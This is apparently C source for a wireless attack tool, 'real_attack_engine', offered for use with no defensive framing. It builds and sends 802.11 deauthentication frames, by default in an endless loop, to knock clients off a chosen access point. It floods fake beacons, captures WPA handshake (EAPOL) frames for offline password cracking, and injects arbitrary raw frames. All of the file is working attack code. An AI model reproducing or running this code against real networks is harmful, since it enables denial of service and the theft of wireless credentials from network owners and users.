#include "real_attack_engine.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>

static int open_raw_socket(const char *iface)
{
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return -1; }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl SIOCGIFINDEX"); close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) { perror("bind"); close(fd); return -1; }
    return fd;
}

int parse_mac(const char *str, uint8_t *mac)
{
    unsigned int bytes[6];
    if (sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
               &bytes[0], &bytes[1], &bytes[2],
               &bytes[3], &bytes[4], &bytes[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)bytes[i];
    return 0;
}

void format_mac(const uint8_t *mac, char *out)
{
    sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int build_deauth_frame(uint8_t *buf, const uint8_t *bssid, const uint8_t *station, uint16_t reason)
{
    int off = 0;
    memset(buf, 0, HACKIT_RADIOTAP_LEN + 26);
    buf[0] = 0x00; buf[1] = 0x00;
    buf[2] = HACKIT_RADIOTAP_LEN;
    buf[3] = 0x00;
    buf[4] = 0x02; buf[5] = 0x00; buf[6] = 0x00; buf[7] = 0x00;
    buf[8] = 0x00;
    off += HACKIT_RADIOTAP_LEN;
    buf[off] = 0xC0; buf[off + 1] = 0x00;
    off += 2;
    buf[off] = 0x01; buf[off + 1] = 0x3A;
    off += 2;
    memcpy(&buf[off], station, 6); off += 6;
    memcpy(&buf[off], bssid, 6); off += 6;
    memcpy(&buf[off], bssid, 6); off += 6;
    static uint16_t seq = 0;
    seq = (seq + 1) & 0xFFF;
    buf[off] = (uint8_t)((seq << 4) & 0xFF);
    buf[off + 1] = (uint8_t)((seq << 4) >> 8);
    off += 2;
    buf[off] = reason & 0xFF; buf[off + 1] = (reason >> 8) & 0xFF;
    return off + 2;
}

int build_beacon_frame(uint8_t *buf, int buf_len, const char *ssid, const uint8_t *bssid, uint8_t channel)
{
    int ssid_len = ssid ? (int)strlen(ssid) : 0;
    if (ssid_len > 32) ssid_len = 32;
    int total = HACKIT_RADIOTAP_LEN + 24 + 12 + 2 + ssid_len + 3 + 10 + 2;
    if (total > buf_len) return -1;
    memset(buf, 0, total);
    buf[2] = HACKIT_RADIOTAP_LEN;
    int off = HACKIT_RADIOTAP_LEN;
    buf[off] = 0x80; buf[off + 1] = 0x00;
    buf[off + 2] = 0x00; buf[off + 3] = 0x00;
    memset(&buf[off + 4], 0xFF, 6);
    memcpy(&buf[off + 10], bssid, 6);
    memcpy(&buf[off + 16], bssid, 6);
    off += 24;
    uint64_t ts = (uint64_t)time(NULL);
    memcpy(&buf[off], &ts, 8); off += 8;
    uint16_t bi = 100;
    memcpy(&buf[off], &bi, 2); off += 2;
    uint16_t caps = 0x0431;
    memcpy(&buf[off], &caps, 2); off += 2;
    buf[off++] = 0; buf[off++] = (uint8_t)ssid_len;
    if (ssid_len > 0) { memcpy(&buf[off], ssid, ssid_len); off += ssid_len; }
    buf[off++] = 1; buf[off++] = 8;
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    memcpy(&buf[off], rates, 8); off += 8;
    buf[off++] = 3; buf[off++] = 1; buf[off++] = channel;
    return off;
}

int send_deauth(const char *iface, const char *bssid, const char *station, int count)
{
    uint8_t bmac[6], smac[6];
    if (parse_mac(bssid, bmac) < 0) { fprintf(stderr, "Invalid BSSID: %s\n", bssid); return -1; }
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t *sta = broadcast;
    if (station && strlen(station) > 0 && parse_mac(station, smac) == 0)
        sta = smac;
    int fd = open_raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t frame[MAX_FRAME_SIZE];
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    int targeted = memcmp(sta, broadcast, 6) != 0;
    int sent = 0;
    if (count < 1) {
        while (1) {
            int len = build_deauth_frame(frame, bmac, sta, 7);
            ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
            if (n == len) sent++;
            if (targeted) {
                len = build_deauth_frame(frame, sta, bmac, 7);
                n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
                if (n == len) sent++;
            }
        }
    } else {
        for (int i = 0; i < count; i++) {
            int len = build_deauth_frame(frame, bmac, sta, 7);
            ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
            if (n == len) sent++;
            if (targeted) {
                len = build_deauth_frame(frame, sta, bmac, 7);
                n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
                if (n == len) sent++;
            }
        }
    }
    close(fd);
    fprintf(stderr, "[DEAUTH] Sent %d frames on %s -> %s\n", sent, iface, bssid);
    return sent;
}

int flood_beacons(const char *iface, const char *ssid, int count)
{
    uint8_t bssid[6];
    srand((unsigned int)(time(NULL) ^ (uintptr_t)iface));
    bssid[0] = 0x02;
    for (int i = 1; i < 6; i++) bssid[i] = rand() & 0xFF;
    int fd = open_raw_socket(iface);
    if (fd < 0) return -1;
    uint8_t frame[MAX_FRAME_SIZE];
    uint8_t channel = (uint8_t)((rand() % 11) + 1);
    int len = build_beacon_frame(frame, sizeof(frame), ssid, bssid, channel);
    if (len < 0) { close(fd); return -1; }
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    int sent = 0;
    for (int i = 0; i < count; i++) {
        bssid[5] = rand() & 0xFF;
        memcpy(&frame[HACKIT_RADIOTAP_LEN + 10], bssid, 6);
        memcpy(&frame[HACKIT_RADIOTAP_LEN + 16], bssid, 6);
        frame[HACKIT_RADIOTAP_LEN + 22] = (i & 0x0F) << 4;
        frame[HACKIT_RADIOTAP_LEN + 23] = (i >> 4) & 0xFF;
        uint64_t ts = (uint64_t)time(NULL);
        memcpy(&frame[HACKIT_RADIOTAP_LEN + 24], &ts, 8);
        ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
        if (n == len) sent++;
        usleep(5000);
    }
    close(fd);
    printf("[BEACON] Flooded %d beacons (SSID: %s) on %s\n", sent, ssid ? ssid : "(empty)", iface);
    return sent;
}

int capture_handshake(const char *iface, const char *bssid, int timeout, const char *output)
{
    uint8_t bmac[6];
    uint8_t target[6];
    int have_target = 0;
    if (bssid && strlen(bssid) > 0 && parse_mac(bssid, bmac) == 0) {
        memcpy(target, bmac, 6);
        have_target = 1;
    }
    int fd = open_raw_socket(iface);
    if (fd < 0) return -1;
    FILE *f = output && strlen(output) > 0 ? fopen(output, "wb") : NULL;
    if (!f && output && strlen(output) > 0) {
        fprintf(stderr, "Cannot open output file %s\n", output);
        close(fd);
        return -1;
    }
    uint8_t buf[MAX_FRAME_SIZE];
    uint64_t end = (uint64_t)time(NULL) + timeout;
    int captured = 0;
    int eapol_count = 0;
    while ((uint64_t)time(NULL) < end) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) { usleep(10000); continue; }
        if (n < 24) continue;
        if (have_target) {
            int match = 0;
            for (int off = 4; off <= 16; off += 6)
                if (memcmp(&buf[off], target, 6) == 0) { match = 1; break; }
            if (!match) continue;
        }
        if (f) fwrite(buf, 1, n, f);
        captured++;
        if (n > 50) {
            for (int i = 24; i < n - 4; i++) {
                if (buf[i] == 0x88 && buf[i + 1] == 0x8E && (buf[i + 2] & 0x03) == 0x02) {
                    eapol_count++;
                    printf("[HANDSHAKE] EAPOL frame detected! (count: %d)\n", eapol_count);
                    break;
                }
            }
        }
    }
    if (f) { fclose(f); printf("[HANDSHAKE] Saved %d frames to %s\n", captured, output); }
    close(fd);
    printf("[HANDSHAKE] Capture complete: %d frames, %d EAPOL messages\n", captured, eapol_count);
    return eapol_count;
}

int inject_frame(const char *iface, const uint8_t *frame, int len)
{
    if (!iface || !frame || len <= 0 || len > MAX_FRAME_SIZE) return -1;
    int fd = open_raw_socket(iface);
    if (fd < 0) return -1;
    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&dest, sizeof(dest));
    close(fd);
    if (n != len) { fprintf(stderr, "inject_frame failed: %s\n", strerror(errno)); return -1; }
    return 0;
}

static void print_usage(const char *prog)
{
    fprintf(stderr, "Usage: %s <command> [args]\n", prog);
    fprintf(stderr, "  deauth <iface> <bssid> [station] [count=0=infinite]\n");
    fprintf(stderr, "  beacon <iface> <ssid> [count]\n");
    fprintf(stderr, "  handshake <iface> <bssid> <timeout> <output>\n");
    fprintf(stderr, "  inject <iface> <hexdata>\n");
}

int main(int argc, char **argv)
{
    if (argc < 3) { print_usage(argv[0]); return 1; }
    const char *cmd = argv[1];
    const char *iface = argv[2];
    if (strcmp(cmd, "deauth") == 0) {
        if (argc < 4) { print_usage(argv[0]); return 1; }
        const char *bssid = argv[3];
        const char *station = argc > 4 ? argv[4] : NULL;
        int count = argc > 5 ? atoi(argv[5]) : 0;
        return send_deauth(iface, bssid, station, count) > 0 ? 0 : 1;
    } else if (strcmp(cmd, "beacon") == 0) {
        if (argc < 4) { print_usage(argv[0]); return 1; }
        const char *ssid = argv[3];
        int count = argc > 4 ? atoi(argv[4]) : 50;
        if (count < 1) count = 50;
        return flood_beacons(iface, ssid, count) > 0 ? 0 : 1;
    } else if (strcmp(cmd, "handshake") == 0) {
        if (argc < 5) { print_usage(argv[0]); return 1; }
        const char *bssid = argv[3];
        int timeout = atoi(argv[4]);
        const char *output = argc > 5 ? argv[5] : "capture.pcap";
        if (timeout < 1) timeout = 30;
        return capture_handshake(iface, bssid, timeout, output) >= 0 ? 0 : 1;
    } else if (strcmp(cmd, "inject") == 0) {
        if (argc < 4) { print_usage(argv[0]); return 1; }
        int hexlen = (int)strlen(argv[3]) / 2;
        uint8_t *data = malloc(hexlen);
        if (!data) return 1;
        for (int i = 0; i < hexlen; i++)
            sscanf(argv[3] + i * 2, "%2hhx", &data[i]);
        int ret = inject_frame(iface, data, hexlen);
        free(data);
        return ret;
    } else {
        print_usage(argv[0]);
        return 1;
    }
}
